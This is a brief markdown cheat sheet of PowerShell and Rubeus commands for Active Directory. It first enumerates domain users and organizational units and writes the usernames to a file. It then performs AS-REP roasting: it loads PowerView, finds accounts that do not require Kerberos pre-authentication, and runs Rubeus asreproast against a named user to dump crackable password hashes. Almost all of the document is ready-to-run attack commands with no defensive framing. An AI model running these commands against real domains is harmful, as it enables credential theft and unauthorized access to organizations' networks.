## Get User info in Active Directory
```
Get-ADUser -Filter *
```

```
Get-ADOrganizationalUnit -Filter *
```

```
Get-DomainUser | Select-Object -ExpandProperty cn | Out-File users.txt
```
## As-REP Roasting
- First Find User with Keberos No_Preauthentication
```
. .\PowerView.ps1
```
```
Get-DomainUser | Where-Object { $_.useraccountcontrol -like "*DONT_REQ_PREAUTH"}
```
```
.\Rubeus.exe asreproast /usr:johnny /outfile:file.txt
```
